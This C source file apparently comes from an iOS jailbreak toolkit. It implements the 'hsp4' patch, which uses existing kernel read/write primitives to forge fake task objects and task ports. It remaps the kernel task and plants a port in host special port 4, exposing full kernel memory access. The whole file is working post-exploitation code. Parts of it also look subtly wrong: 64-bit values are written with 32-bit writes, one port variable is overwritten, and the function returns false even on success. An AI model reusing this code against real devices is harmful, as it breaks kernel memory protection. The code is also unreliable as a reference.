#include "hsp4.h"

#include <stdio.h>
#include <stdlib.h>

#include "mach_vm.h"
#include "patchfinder.h"

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_NONE 0

#define trunc_page_kernel(x)   ((x) & (~vm_kernel_page_mask))
#define round_page_kernel(x)   trunc_page_kernel((x) + vm_kernel_page_mask)

const uint64_t kernel_address_space_base = 0xffff000000000000;

void kmemcpy(uint64_t dest, uint64_t src, uint32_t length)
{
	if (dest >= kernel_address_space_base) {
		kernel_write(dest, (void*) src, length);
	} else {
		kernel_read(src, (void*)dest, length);
	}
}

uint64_t kmem_alloc(uint64_t size)
{
	if (kernel_task_port == MACH_PORT_NULL) {
	    fprintf(stdout, "attempt to allocate kernel memory before any kernel memory write primitives available\n");

	    return 0;
	}
	  
	kern_return_t err;

	mach_vm_address_t addr = 0;
	mach_vm_size_t ksize = round_page_kernel(size);

	err = mach_vm_allocate(kernel_task_port, &addr, ksize, VM_FLAGS_ANYWHERE);
	
	if (err != KERN_SUCCESS) {
		fprintf(stdout, "unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);

		return 0;
	}
	
	return addr;
}

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr)
{
	uint64_t port_kaddr;

	kernel_ipc_port_lookup(current_task,
							port,
							&port_kaddr,
							NULL);

	kernel_write32(port_kaddr + OFFSET(ipc_port, io_bits), IO_BITS_ACTIVE | IKOT_TASK);
	kernel_write32(port_kaddr + OFFSET(ipc_port, io_references), 0xf00d);
	kernel_write32(port_kaddr + OFFSET(ipc_port, ip_srights), 0xf00d);
	kernel_write32(port_kaddr + OFFSET(ipc_port, ip_receiver), space);
	kernel_write32(port_kaddr + OFFSET(ipc_port, ip_kobject), task_kaddr);

	uint64_t task_port_addr = task_self_addr();
	uint64_t task_addr = kernel_read64(task_port_addr + OFFSET(ipc_port, ip_kobject));

	uint64_t itk_space = kernel_read64(task_addr + OFFSET(task, itk_space));
	uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));

	uint32_t port_index = port >> 8;
	const int sizeof_ipc_entry_t = 0x18;

	uint32_t bits = kernel_read32(is_table + (port_index * sizeof_ipc_entry_t) + 0x8);

#define IE_BITS_SEND (1 << 16)
#define IE_BITS_RECEIVE (1 << 17)

	bits &= (~IE_BITS_RECEIVE);
	bits |= IE_BITS_SEND;

	kernel_write32(is_table + (port_index * sizeof_ipc_entry_t) + 0x8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr)
{
	uint64_t ipc_space_kernel;

	ipc_space_kernel = kernel_read64(task_kaddr + OFFSET(ipc_port, ip_receiver));

	convert_port_to_task_port(port, ipc_space_kernel, task_kaddr);
}


kern_return_t mach_vm_remap(vm_map_t dst,
							mach_vm_address_t *dst_addr,
							mach_vm_size_t size,
							mach_vm_offset_t mask,
							int flags,
							vm_map_t src,
							mach_vm_address_t src_addr,
							boolean_t copy,
							vm_prot_t *cur_prot,
							vm_prot_t *max_prot,
							vm_inherit_t inherit);

uint64_t make_fake_task(uint64_t vm_map)
{
	uint64_t fake_task_kaddr = kmem_alloc(0x1000);

	void *fake_task = malloc(0x1000);

	memset(fake_task, 0, 0x1000);

	*(uint32_t*)(fake_task + OFFSET(task, active)) = 1;
	*(uint64_t*)(fake_task + OFFSET(task, vm_map)) = vm_map;
	*(uint8_t*)(fake_task + OFFSET(task, lck_mtx_type)) = 0x22;

	kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);

	free(fake_task);

	return fake_task_kaddr;
}


bool perform_hsp4_patch(mach_port_t *port)
{
	int ret;
	mach_port_t host;

	uint64_t remapped_task_addr;
	uint64_t kernel_task_kaddr;

	host = mach_host_self();

	uint64_t sizeof_task = 0x1000;

	remapped_task_addr = 0;

	kernel_task_kaddr = kernel_read64(task_self_addr() + OFFSET(ipc_port, ip_kobject));

	while(kernel_task_kaddr != 0)
	{
		uint64_t bsd_info = kernel_read64(kernel_task_kaddr + OFFSET(task, bsd_info));

		uint32_t pid = kernel_read32(bsd_info + OFFSET(proc, p_pid));

		if(pid == 0)
			break;

		kernel_task_kaddr = kernel_read64(kernel_task_kaddr + OFFSET(task, prev));
	}

	if(kernel_task_kaddr == 0)
	{
		fprintf(stderr, "[remap_hsp4] failed to find kernel task\n");

		return false;
	}

	mach_port_t zm_fake_task_port = MACH_PORT_NULL;
	mach_port_t km_fake_task_port = MACH_PORT_NULL;

	ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);

	ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);

	if(ret == KERN_SUCCESS)
		ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);

	if(ret != KERN_SUCCESS)
	{
		fprintf(stderr, "[remap_hsp4] unable to allocate ports: 0x%x, (%s)\n", ret, mach_error_string(ret));

		return false;
	}

	/*
	Finish the patch by locating the kernel map and zone map
	Making a fake task out of the new zone and kernel map ports
	Remap the kernel task to a new virtual address
	Verify the remapped address different from old one
	Wire the memory so that it gets paged in
	Make a new task port out of the new allocated port
	*/

	uint64_t zone_map_kptr = find_zone_map_ref();

	if(!zone_map_kptr)
	{
		fprintf(stderr, "[remap_hsp4] could not find the zone map ref\n");

		return false;
	}

	uint64_t zone_map = kernel_read64(zone_map_kptr);

	uint64_t kernel_map = kernel_read64(kernel_task_kaddr + OFFSET(task, vm_map));

	uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
	uint64_t km_fake_task_kptr = make_fake_task(kernel_map);

	make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
	make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);

	km_fake_task_port = zm_fake_task_port;

	vm_prot_t cur, max;

	ret = mach_vm_remap(km_fake_task_port,
	                    &remapped_task_addr,
	                    sizeof_task,
	                    0,
	                    VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
	                    zm_fake_task_port,
	                    kernel_task_kaddr,
	                    0,
	                    &cur, &max,
	                    VM_INHERIT_NONE);

	if (ret != KERN_SUCCESS) {
	    fprintf(stderr, "[remap_hsp4] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
	    
	    return false;
	}

	if (kernel_task_kaddr == remapped_task_addr) {
	   fprintf(stderr, "[remap_hsp4] remap failure: addr is the same after remap\n");
	    
	    return false;
	}

	printf("[remap_hsp4] remapped successfully to 0x%llx\n", remapped_task_addr);

	ret = mach_vm_wire(host, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);

	if (ret != KERN_SUCCESS) {
		fprintf(stderr, "[remap_hsp4] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));

		return false;
	}

	uint64_t port_kaddr;

	kernel_ipc_port_lookup(current_task,
							*port,
							&port_kaddr,
							NULL);


	const int offsetof_host_special = 0x10;

	uint64_t host_kaddr;
	uint64_t real_host_kaddr;

	kernel_ipc_port_lookup(current_task,
							host,
							&host_kaddr,
							NULL);

	real_host_kaddr = kernel_read64(host_kaddr + OFFSET(ipc_port, ip_kobject));

	kernel_write64(real_host_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);

	return false;
}